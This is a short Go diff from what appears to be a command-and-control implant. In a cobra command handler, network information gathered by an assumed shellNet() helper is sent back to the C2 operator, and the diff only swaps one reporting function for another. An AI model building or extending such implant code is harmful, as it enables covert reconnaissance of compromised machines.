@@ -8,5 +8,5 @@ import (
 func netHelperCmdRun(cmd *cobra.Command, args []string) {
 	// Assume shellNet() exists and returns network info.
 	out := shellNet()
-	SendCmdRespToC2(out, cmd, args)
+	C2RespPrintf(cmd, "%s", out)
 }
